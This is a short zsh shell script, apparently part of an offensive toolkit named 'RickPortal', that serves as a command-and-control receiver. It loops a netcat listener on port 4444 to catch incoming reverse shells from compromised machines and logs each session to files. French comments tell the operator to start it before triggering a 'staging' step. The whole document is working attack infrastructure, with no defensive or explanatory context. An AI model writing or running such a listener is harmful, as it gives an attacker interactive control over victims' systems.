#!/bin/zsh
# delivery/c2.sh - poste de commande : chaque shell entrant est logge
# Laisse tourner avant de declencher le staging.
mkdir -p ~/Desktop/RickPortal/Reception/Shells
i=0
while true; do
    i=$((i+1))
    echo "[*] session $i - $(date)" | tee -a ~/Desktop/RickPortal/Reception/Shells/sessions.log
    # BSD nc (macOS): port en positionnel, PAS avec -p en mode listen
    nc -lvn 4444 2>&1 | tee ~/Desktop/RickPortal/Reception/Shells/session_$i.log
    sleep 1
done
